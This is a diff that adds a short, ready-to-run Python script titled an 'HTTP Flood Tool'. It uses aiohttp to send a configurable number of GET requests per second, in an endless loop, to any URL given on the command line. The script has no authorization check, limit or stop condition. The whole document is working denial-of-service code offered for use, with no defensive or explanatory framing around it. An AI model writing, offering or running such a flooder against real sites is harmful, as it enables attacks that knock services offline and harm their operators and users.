@@ -1,0 +1,48 @@
+RK  
+Title: Async HTTP Flood Tool with Configurable RPS  
+```python
+# language: Python, file: async_http_flood.py, target: Python 3.7+
+import asyncio
+import aiohttp
+import time
+import sys
+
+class HttpFlood:
+    def __init__(self, url, rps):
+        self.url = url
+        self.rps = rps
+        self.session = aiohttp.ClientSession()
+
+    async def send_request(self):
+        try:
+            async with self.session.get(self.url) as response:
+                await response.text() # Force reading of the response body
+        except Exception as e:
+            print(f"Request failed: {e}", file=sys.stderr)
+
+    async def flood(self):
+        while True:
+            tasks = [self.send_request() for _ in range(self.rps)]
+            await asyncio.gather(*tasks)
+            await asyncio.sleep(1)
+
+    async def close(self):
+        await self.session.close()
+
+async def main(url, rps):
+    flooder = HttpFlood(url, rps)
+    try:
+        await flooder.flood()
+    finally:
+        await flooder.close()
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print("Usage: python async_http_flood.py <url> <rps>")
+        sys.exit(1)
+
+    url = sys.argv[1]
+    rps = int(sys.argv[2])
+
+    asyncio.run(main(url, rps))
+```
